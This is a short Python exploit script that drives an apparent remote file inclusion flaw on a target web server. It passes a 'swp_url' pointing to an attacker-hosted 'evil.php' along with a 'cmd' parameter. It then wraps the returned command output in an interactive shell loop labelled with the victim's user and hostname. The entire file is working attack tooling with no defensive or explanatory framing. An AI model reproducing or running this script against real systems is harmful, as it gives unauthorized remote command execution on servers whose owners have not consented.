import requests, os
from dotenv import load_dotenv, dotenv_values
from bs4 import BeautifulSoup as Soup
from colorama import Fore

print('[+] init environment...')
load_dotenv()
SCHEME = os.getenv('SCHEME') or 'http'
HOST = os.getenv('HOST') or '127.0.0.1'
VICTIM_PORT = os.getenv('VICTIM_PORT') or '9090'
ATTACKER_HOST = os.getenv('ATTACKER_HOST') or 'attacker.com'
ATTACKER_PORT = os.getenv('ATTACKER_PORT') or '9091'
victim_origin = f'{SCHEME}://{HOST}:{VICTIM_PORT}'
attacker_origin = f'{SCHEME}://{ATTACKER_HOST}:{ATTACKER_PORT}'

print('[+] init request session')
target = requests.session()

def RCE(cmd='whoami'):
    print('[+] sending request to target...')
    result = target.get(url=f'{victim_origin}?swp_url={attacker_origin}/evil.php&cmd={cmd}')
    print('[+] parsing the response...')
    soup = Soup(result.text, 'html.parser');
    return result.text[result.text.index('</h1>')+5:].strip('\n')
name = f'{RCE()}@{RCE('hostname')}'
while True:
    cmd = input(f'[{Fore.RED}{name}{Fore.RESET}]$ ')
    print(RCE(cmd))

